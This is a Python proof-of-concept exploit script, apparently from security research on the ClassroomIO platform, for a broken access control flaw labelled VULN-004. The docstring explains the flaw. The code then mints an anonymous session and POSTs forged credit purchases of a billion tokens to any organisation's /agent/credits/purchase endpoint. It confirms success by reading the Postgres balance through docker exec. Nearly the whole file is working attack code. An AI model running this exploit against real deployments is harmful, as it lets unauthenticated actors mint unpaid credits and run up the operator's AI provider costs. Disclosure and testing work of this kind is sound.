#!/usr/bin/env python3
"""
VULN-004 (F-05) — `POST /agent/credits/purchase` mints unlimited AI credits.

Vulnerable code (targets/classroomio/):
  * route:      apps/api/src/routes/agent/agent.ts:301-310
  * middleware: apps/api/src/middlewares/auth-or-api-key.ts:12-19   (first branch: any session passes)
  * service:    apps/api/src/services/agent/credit-purchase.ts:9-21
  * query:      packages/db/src/queries/agent/credit-purchase.ts:120-127  (balance += body.tokens)
  * schema:     packages/utils/src/validation/agent/agent.ts:63-72

Class: CWE-284 / CWE-639 broken access control on a payment-webhook-shaped sink.

The flaw: the endpoint is shaped like a Polar payment webhook (record a purchase,
add AI credits) but is gated by `authOrApiKeyMiddleware`, whose FIRST branch passes
for any request that carries *any* user session — including an anonymous-plugin
session (VULN-018). There is no HMAC/signature verification, no org-admin check, and
no membership check tying the caller to `body.orgId`. `orgId`, `tokens`, and
`providerOrderId` all come straight from the request body; the query blindly does
`balance += tokens` for the attacker-chosen org.

Exploitation idea: mint an anonymous session (unauthenticated), then POST a forged
"purchase" of 1e9 tokens for the target org. Repeat with a fresh providerOrderId for
unbounded top-ups. All quota-gated AI then runs on the operator's provider key.

A successful run proves: an UNAUTHENTICATED actor (anon session) increments an org's
`ai_credit_balance` by an arbitrary amount, with no payment, signature, or membership.
"""
import os
import sys
import secrets
import subprocess

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, anon_session, ORG_ID, rid  # noqa: E402

VULN = "VULN-004"
TARGET_ORG = os.environ.get("ORG_ID", ORG_ID)
TOKENS = int(os.environ.get("TOKENS", "1000000000"))  # 1e9 credits per forged purchase
PG_CONTAINER = os.environ.get("PG_CONTAINER", "cio-postgres")


def db_balance(org_id):
    """Read the org's ai_credit_balance directly from Postgres (ground-truth side effect)."""
    try:
        out = subprocess.check_output(
            ["docker", "exec", PG_CONTAINER, "psql", "-U", "postgres", "-d", "classroomio",
             "-t", "-A", "-c",
             f"select coalesce(balance,0) from ai_credit_balance where org_id='{org_id}';"],
            text=True, timeout=20).strip()
        return int(out) if out else 0
    except Exception as e:
        log("INFO", f"  (could not read DB balance: {e})")
        return None


def main():
    banner(VULN, "Unlimited AI-credit minting via /agent/credits/purchase")
    log("INFO", "route apps/api/src/routes/agent/agent.ts:301-310 gated by authOrApiKeyMiddleware")
    log("INFO", "auth-or-api-key.ts:12-19 passes for ANY session — no HMAC, no org-admin, no membership")

    before = db_balance(TARGET_ORG)
    log("INFO", f"target org {TARGET_ORG} ai_credit_balance before = {before}")

    # Precondition: an unauthenticated attacker mints an anonymous session (VULN-018).
    log("SETUP", "minting an anonymous session (unauthenticated) — the bug is reachable with no account")
    attacker = anon_session()
    log("SETUP", f"anon user={attacker.user.get('id')} isAnonymous={attacker.user.get('isAnonymous')} "
                 f"orgRoles={attacker.org_roles()} (NOT a member of the target org)")

    # The forged "purchase": every field is attacker-chosen, no signature binds it to a real order.
    order_id = f"cvehunt-{rid('ord')}-{secrets.token_hex(4)}"
    body = {"orgId": TARGET_ORG, "providerOrderId": order_id, "tokens": TOKENS,
            "quantity": 1, "unitPriceCents": 0, "currency": "USD"}
    log("STEP", f"POST /agent/credits/purchase orgId={TARGET_ORG} tokens={TOKENS} providerOrderId={order_id}")
    r = attacker.post("/agent/credits/purchase", json=body)
    log("INFO", f"  response: HTTP {r.status_code} {r.text[:200]}")

    # Persist request/response evidence.
    here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"POST /agent/credits/purchase (anonymous session cookie)\nHTTP {r.status_code}\n\n{r.text}\n")

    after = db_balance(TARGET_ORG)
    log("INFO", f"target org ai_credit_balance after = {after}")

    ok_http = r.status_code == 200 and r.json().get("success") is True
    ok_db = (before is not None and after is not None and after - before >= TOKENS)

    if ok_http and (ok_db or before is None):
        if ok_db:
            log("PROOF", f"balance rose by {after - before} (>= {TOKENS}) with no payment/signature/membership "
                         f"— an anonymous actor minted credits for an org it does not belong to")
        else:
            log("PROOF", f"HTTP 200 success and a ledger row was recorded for order {order_id} "
                         f"(DB read unavailable, but the API confirmed the forged purchase)")
        verdict(VULN, "CONFIRMED", "anon session mints arbitrary AI credits for any org (no HMAC/authz)")
        log("OK", "exploit confirmed — unbounded AI-credit minting, unauthenticated")
        sys.exit(0)

    verdict(VULN, "FAILED", f"HTTP {r.status_code}; balance {before}->{after}")
    log("FAIL", "purchase was not accepted or balance did not increase")
    sys.exit(1)


if __name__ == "__main__":
    main()
